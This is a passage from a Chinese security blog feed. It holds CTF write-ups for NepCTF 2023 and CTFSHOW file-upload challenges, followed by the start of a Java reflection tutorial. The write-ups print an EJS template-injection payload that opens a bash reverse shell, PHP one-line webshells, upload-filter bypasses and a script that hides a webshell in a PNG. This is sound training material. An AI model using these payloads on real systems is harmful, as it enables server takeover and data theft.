class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="/img/NepCTF-2023/13.png" alt=""></p><p>发送后，可以看到，反弹shell成功了</p><p><img src="/img/NepCTF-2023/14.png" alt=""></p><p>利用的是php产生的临时文件，而这个临时文件的文件名是<strong>随机</strong>的，因此用<strong>glob伪协议</strong>去锁定。然后劫持</p><p>触发LD_PRELOAD的函数，常见的2个<code>mail、error_log</code>都可以触发系统函数<code>send_mail</code>进而触发LD劫持，但是这里ban了这2个函数，因此还有个替代品<code>mb_send_mail</code>最后RCE</p><p>在根目录下查看到flag</p><p><img src="/img/NepCTF-2023/15.png" alt=""></p><p>但是发现没有权限：</p><p><img src="/img/NepCTF-2023/16.png" alt=""></p><p>用环境变量提权。因为我们有一个suid的二进制文件<code>showmsg</code></p><p><img src="/img/NepCTF-2023/17.png" alt=""></p><p>提权成功，然后给777权限给flag，直接读就好了</p><p><img src="/img/NepCTF-2023/18.png" alt=""></p><h2 id="Post-Crad-For-You"><a href="#Post-Crad-For-You" class="headerlink" title="Post Crad For You"></a>Post Crad For You</h2><p>先拿到题目代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span></span><br><span class="line"></span><br><span class="line">templateDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;template&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;template&#x27;</span>, templateDir);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sleep</span>(<span class="params">milliSeconds</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">StartTime</span> =<span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>();</span><br><span class="line">    <span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>() &lt;<span class="title class_">StartTime</span>+milliSeconds);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">sendFile</span>(<span class="string">&#x27;./index.html&#x27;</span>, &#123;<span class="attr">root</span>: __dirname&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/create&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> uuid;</span><br><span class="line">    <span class="keyword">let</span> name = req.<span class="property">query</span>.<span class="property">name</span> ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">let</span> address = req.<span class="property">query</span>.<span class="property">address</span> ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">let</span> message = req.<span class="property">query</span>.<span class="property">message</span> ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        uuid = crypto.<span class="title function_">randomUUID</span>();</span><br><span class="line">    &#125; <span class="keyword">while</span> (fs.<span class="title function_">existsSync</span>(<span class="string">`<span class="subst">$&#123;templateDir&#125;</span>/<span class="subst">$&#123;uuid&#125;</span>.ejs`</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (name != <span class="string">&#x27;&#x27;</span> &amp;&amp; address != <span class="string">&#x27;&#x27;</span> &amp;&amp; message != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> source = [<span class="string">&quot;source&quot;</span>, <span class="string">&quot;source1&quot;</span>, <span class="string">&quot;source2&quot;</span>, <span class="string">&quot;source3&quot;</span>].<span class="title function_">sort</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0.5</span> - <span class="title class_">Math</span>.<span class="title function_">random</span>();</span><br><span class="line">            &#125;)</span><br><span class="line">            fs.<span class="title function_">readFile</span>(source[<span class="number">0</span>]+<span class="string">&quot;.html&quot;</span>, <span class="string">&#x27;utf8&#x27;</span>,<span class="keyword">function</span>(<span class="params">err, pageContent</span>)&#123;</span><br><span class="line">                fs.<span class="title function_">writeFileSync</span>(<span class="string">`<span class="subst">$&#123;templateDir&#125;</span>/<span class="subst">$&#123;uuid&#125;</span>.ejs`</span>, pageContent.<span class="title function_">replace</span>(<span class="regexp">/--ID--/g</span>, uuid.<span class="title function_">replace</span>(<span class="regexp">/-/g</span>, <span class="string">&quot;&quot;</span>)));</span><br><span class="line">                <span class="title function_">sleep</span>(<span class="number">2000</span>);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Params `name` or `address` or `message` empty&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Failed to write file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`/page?pageid=<span class="subst">$&#123;uuid&#125;</span>&amp;name=<span class="subst">$&#123;name&#125;</span>&amp;address=<span class="subst">$&#123;address&#125;</span>&amp;message=<span class="subst">$&#123;message&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/page&#x27;</span>, <span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> id = req.<span class="property">query</span>.<span class="property">pageid</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="regexp">/^[0-9A-F]&#123;8&#125;-[0-9A-F]&#123;4&#125;-[4][0-9A-F]&#123;3&#125;-[89AB][0-9A-F]&#123;3&#125;-[0-9A-F]&#123;12&#125;$/i</span>.<span class="title function_">test</span>(id) || !fs.<span class="title function_">existsSync</span>(<span class="string">`<span class="subst">$&#123;templateDir&#125;</span>/<span class="subst">$&#123;id&#125;</span>.ejs`</span>)) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&quot;Sorry, no such id&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">`<span class="subst">$&#123;templateDir&#125;</span>/<span class="subst">$&#123;id&#125;</span>.ejs`</span>, req.<span class="property">query</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`App listening on port <span class="subst">$&#123;port&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>发现<code>res.render(`$&#123;templateDir&#125;/$&#123;id&#125;.ejs`, req.query);</code>这段有模板注入的，他把query放进去render了。</p><p>网上是有关于这个的CVE：<a href="https://inhann.top/2023/03/26/ejs/">CVE-2022-29078</a></p><p><strong>payload：</strong></p><p>在url后加入：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;settings[view options][escapeFunction]=console.log;this.global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&quot;bash%20-c%20&#x27;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fip%2Fport%20%3C%261&#x27;&quot;);&amp;settings[view options][client]=true</span><br></pre></td></tr></table></figure><p><img src="/img/NepCTF-2023/23.jpg" alt=""></p><p>反弹shell成功！</p><p><img src="/img/NepCTF-2023/24.jpg" alt=""></p><p>拿到flag</p><p><img src="/img/NepCTF-2023/25.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW-文件上传</title>
      <link href="/2023/08/15/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2023/08/15/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="web151-前端"><a href="#web151-前端" class="headerlink" title="web151(前端)"></a>web151(前端)</h1><p>打开后是一个文件上传点，还贴心的告诉我们<strong>前端校验不可靠</strong></p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/151.png" alt=""></p><p>准备好一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将后缀改为<code>.png</code> ，上传文件，抓包</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/151_01.png" alt=""></p><p>将<code>shell.png</code>改为<code>shell.php</code>后，发送</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/151_02.png" alt=""></p><p>得到上传路径，蚁剑连接，拿到flag</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/151_03.png" alt=""></p><h1 id="web152"><a href="#web152" class="headerlink" title="web152()"></a>web152()</h1><p>操作与上题一样</p><h1 id="web153-user-ini"><a href="#web153-user-ini" class="headerlink" title="web153(.user.ini)"></a>web153(.user.ini)</h1><p>进行上题的操作时，发现没有路径回显</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/153.png" alt=""></p><p>将后缀修改为<code>shell.php4</code>后上传，发现上传成功，但是不解析</p><p>试试上传配置文件,访问upload,发现有可执行文件index.php,可以用上传<code>.user.ini</code>来进行文件包含</p><blockquote><p>user.ini.它比.htaccess用的更广，不管是nginx/<a href="https://so.csdn.net/so/search?q=apache&amp;spm=1001.2101.3001.7020">apache</a>/IIS，只要是以fastcgi运行的php都可以用这个方法。<br>条件:<br>服务器脚本语言为PHP<br>对应目录下面有可执行的php文件,如index.php<br>服务器使用CGI／FastCGI模式</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=shell.png <span class="comment">// 包含shell.png文件</span></span><br></pre></td></tr></table></figure><p>上传完之后访问<code>/upload/index.php</code>，蚁剑连接，拿到flag</p><h1 id="web154"><a href="#web154" class="headerlink" title="web154()"></a>web154()</h1><p>传马时，发现文件内容不合规</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/154.png" alt=""></p><p>测试之后发现不能存在<code>php</code>字样</p><p>将木马改为<code>&lt;?= @eval($_POST[1]);?&gt;</code>后上传，发现图片可以上传，再利用上题的方法，文件包含上传的<code>shell.png</code></p><p>蚁剑连接，拿到flag</p><h1 id="web155"><a href="#web155" class="headerlink" title="web155()"></a>web155()</h1><p>上传图片测试，发现文件类型不合规</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/155.png" alt=""></p><p>在上面的基础上，内容前加<code>GIF89a</code></p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/155_01.png" alt=""></p><p>利用配置文件包含，上传成功，蚁剑连接拿flag</p><h1 id="web156"><a href="#web156" class="headerlink" title="web156()"></a>web156()</h1><p>依旧文件类型不合格，重复上面操作试一下，经过测试发现本题过滤了<code>[]</code></p><p>可以将<code>[]</code>替换<code>&#123;&#125;</code>进行绕过</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/156.png" alt=""></p><p>上传成功，利用配置文件包含，蚁剑连接拿flag</p><h1 id="web157"><a href="#web157" class="headerlink" title="web157()"></a>web157()</h1><p>在上题的基础上过滤了<code>&#123;&#125;</code>和<code>;</code>，那就都不用了，利用<code>array_pop()</code>进行RCE</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/157.png" alt=""></p><p>再利用配置文件包含进行rce</p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">访问/upload/index.php</span><br><span class="line"></span><br><span class="line">POST: <span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat ../f*&quot;</span>);</span><br></pre></td></tr></table></figure><h1 id="web158-log"><a href="#web158-log" class="headerlink" title="web158(log)"></a>web158(log)</h1><p>操作与上题一样</p><p>查看源码发现过滤了<code>log</code></p><h1 id="web159"><a href="#web159" class="headerlink" title="web159()"></a>web159()</h1><p>发现本题过滤了<code>()</code></p><p>不用括号的命令执行，可以用<code>include</code>进行日志文件包含，但是上题过滤了<code>log</code>，所以本题用绕过关键字和<code>include</code>结合</p><p>文件内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?=</span> <span class="keyword">include</span> <span class="string">&#x27;/var/l&#x27;</span>.<span class="string">&#x27;og/nginx/access.l&#x27;</span>.<span class="string">&#x27;og&#x27;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/159.png" alt=""></p><p>发现上传成功，利用配置文件包含进行RCE，传马</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/159_01.png" alt=""></p><p>访问<code>/upload/index.php</code></p><p>POST传参：<code>1=system(&#39;cat ../f*&#39;);</code></p><p>拿到flag</p><h1 id="web160"><a href="#web160" class="headerlink" title="web160()"></a>web160()</h1><p>测试后发现本题过滤了空格，我们可以在bp中的十六进制部分的空格改为<code>0d</code></p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/160.png" alt=""></p><p>重复上题操作即可获得flag</p><h1 id="web161"><a href="#web161" class="headerlink" title="web161()"></a>web161()</h1><p>发现本题<code>.ini</code>文件不让上传了，555</p><p>试验了很久，发现还是文件头检测，将配置文件头部加个<code>GIF89a</code></p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/161.png" alt=""></p><p>可以看到，上传成功，重复上体操作即可</p><h1 id="web162-远程文件包含"><a href="#web162-远程文件包含" class="headerlink" title="web162(远程文件包含)"></a>web162(远程文件包含)</h1><p>重复上面的方法，发现不行了</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/162.png" alt=""></p><p>经过测试发现内容不能有<code>.</code></p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/162_01.png" alt=""></p><h1 id="web163-远程文件包含"><a href="#web163-远程文件包含" class="headerlink" title="web163(远程文件包含)"></a>web163(远程文件包含)</h1><h1 id="web164-二次渲染"><a href="#web164-二次渲染" class="headerlink" title="web164(二次渲染)"></a>web164(二次渲染)</h1><p>上传一个正常的文件测试，发现上传成功！</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/164.png" alt=""></p><p>查看后，发现URL有猫腻</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/164_01.png" alt=""></p><p>发现图片名字跟我们上传的图片名不一致，可以猜到这是二次渲染的结果</p><p>可以利用脚本制作图片马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;2.png&#x27;</span>);  <span class="comment">//要修改的图片的路径</span></span><br><span class="line"><span class="comment">/* 木马内容</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将生成的图片上传，设置好参数后，抓包</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/164_02.png" alt=""></p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/164_03.png" alt=""></p><p>可以看到成功执行了，构造Payload</p><p><strong>Payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET: &amp;<span class="number">0</span>=system</span><br><span class="line">POST: <span class="number">1</span>=cat f*</span><br></pre></td></tr></table></figure><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/164_04.png" alt=""></p><h1 id="web165"><a href="#web165" class="headerlink" title="web165()"></a>web165()</h1><p>查看源代码后，发现本题需要的是<code>.jpg</code>文件，上传一张jpg图片抓包</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/165.jpg" alt=""></p><p>当存在<code>gd-jpeg v1.0 (using IJG JPEG v80), default quality</code>这个字符串时，则说明进行了二次渲染</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFSHOW </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反射</title>
      <link href="/2023/08/15/Java%E5%8F%8D%E5%B0%84/"/>
      <url>/2023/08/15/Java%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="反射的概述"><a href="#反射的概述" class="headerlink" title="反射的概述"></a>反射的概述</h1><p>Java反射是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制</p><p><strong>反射就是把java类中的各种成分映射成一个个的Java对象</strong></p><p><img src="/img/Java%E5%8F%8D%E5%B0%84/java.png" alt=""></p><h1 id="反射机制有什么用？"><a href="#反射机制有什么用？" class="headerlink" title="反射机制有什么用？"></a>反射机制有什么用？</h1><ul><li>运行时动态获取类的信息：在编写代码时，对于类的信息是必须在编译时确定的，但在运行时，有时需要根据某些条件，动态获取某个类的信息，这时就可以使用Java中的反射机制。</li><li>动态生成对象：反射机制可以在运行时生成对象，这样就可以根据参数的不同，动态的创建不同的类的实例对象。</li><li>动态调用方法：通过反射机制可以调用类中的方法，不论这些方法是否是公共的，也不论这些方法的参数个数和类型是什么，反射机制都具有这样的能力。</li><li>动态修改属性：利用反射机制可以获取到类中的所有成员变量，并可以对其进行修改。</li><li>实现动态代理：利用反射机制可以实现代理模式，通过代理对象完成原对象对某些方法的调用，同时也可以在这些方法的调用前后做一些额外的处理。</li></ul><h1 id="反射相关的类"><a href="#反射相关的类" class="headerlink" title="反射相关的类"></a>反射相关的类</h1><div class="table-container"><table><thead><tr><th>类</th><th>含义</th></tr></thead><tbody><tr><td>java.lang.Class</td><td>代表整个字节码。代表一个类型，代表整个类。</td></tr><tr><td>java.lang.reflect.Method</td><td>代表字节码中的方法字节码。代表类中的方法。</td></tr><tr><td>java.lang.reflect.Constructor</td><td>代表字节码中的构造方法字节码。代表类中的构造方法。</td></tr><tr><td>java.lang.reflect.Field</td><td>代表字节码中的属性字节码。代表类中的成员变量(静态变量+实例变量)。</td></tr></tbody></table></div><p><strong>注</strong>：<strong>必须先获得Class类才能获取Method、Constructor、Field。</strong></p><h1 id="Class类"><a href="#Class类" class="headerlink" title="Class类"></a>Class类</h1><h2 id="获得类相关的方法"><a href="#获得类相关的方法" class="headerlink" title="获得类相关的方法"></a>获得类相关的方法</h2><div class="table-container"><table><thead><tr><th>方法</th><th>用途</th></tr></thead><tbody><tr><td>asSubclass(Class<U> clazz)</td><td>把传递的类的对象转换成代表其子类的对象</td></tr><tr><td>Cast</td><td>把对象转换成代表类或是接口的对象</td></tr><tr><td>getClassLoader()</td><td>获得类的加载器</td></tr><tr><td>getClasses()</td><td>返回一个数组，数组中包含该类中所有公共类和接口类的对象</td></tr><tr><td>getDeclaredClasses()</td><td>返回一个数组，数组中包含该类中所有类和接口类的对象</td></tr><tr><td>forName(String className)</td><td>根据类名返回类的对象</td></tr><tr><td>getName()</td><td>获得类的完整路径名字</td></tr><tr><td>newInstancen()</td><td>创建类的实例</td></tr><tr><td>getPackage()</td><td>获得类的包</td></tr><tr><td>getSimpleName()</td><td>获得类的名字</td></tr><tr><td>getSuperclass()</td><td>获得当前类继承的父类的名字</td></tr><tr><td>getInterfaces()</td><td>获得当前类实现的类或是接口</td></tr></tbody></table></div><h2 id="获得类中属性相关的方法"><a href="#获得类中属性相关的方法" class="headerlink" title="获得类中属性相关的方法"></a>获得类中属性相关的方法</h2><div class="table-container"><table><thead><tr><th>方法</th><th>用途</th></tr></thead><tbody><tr><td>getField(String name)</td><td>获得某个公有的属性对象</td></tr><tr><td>getFields()</td><td>获得所有公有的属性对象</td></tr><tr><td>getDeclaredField(String name)</td><td>获得某个属性对象</td></tr><tr><td>getDeclaredFields()</td><td>获得所有属性对象</td></tr></tbody></table></div><h2 id="获得类中构造器相关的方法"><a href="#获得类中构造器相关的方法" class="headerlink" title="获得类中构造器相关的方法"></a>获得类中构造器相关的方法</h2><div class="table-container"><table><thead><tr><th>方法</th><th>用途</th></tr></thead><tbody><tr><td>getConstructor(Class…&lt;?&gt; parameterTypes)</td><td>获得该类中与参数类型匹配的公有构造方法</td></tr><tr><td>getConstructors()</td><td>获得该类的所有公有构造方法</td></tr><tr><td>getDeclaredConstructor(Class…&lt;?&gt; parameterTypes)</td><td>获得该类中与参数类型匹配的构造方法</td></tr><tr><td>getDeclaredConstructors()</td><td>获得该类所有构造方法</td></tr></tbody></table></div><h2 id="获得类中方法相关的方法"><a href="#获得类中方法相关的方法" class="headerlink" title="获得类中方法相关的方法"></a>获得类中方法相关的方法</h2><div class="table-container"><table><thead><tr><th>方法</th><th>用途</th></tr></thead><tbody><tr><td>getMethod(String name,Class…&lt;?&gt; parameterTypes)</td><td>获得该类某个公有的方法</td></tr><tr><td>getMethods()</td><td>获得该类所有公有的方法</td></tr><tr><td>getDeclaredMethod(String name.Class…&lt;?&gt; parameterTypes)</td><td>获得该类某个方法</td></tr><tr><td>getDeclaredMethods()</td><td>获得该类所有方法</td></tr></tbody></table></div><h1 id="反射详解"><a href="#反射详解" class="headerlink" title="反射详解"></a>反射详解</h1><p>从完整的的代码，来调用类构造方法，类方法和获取类属性</p><p><strong>Person类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 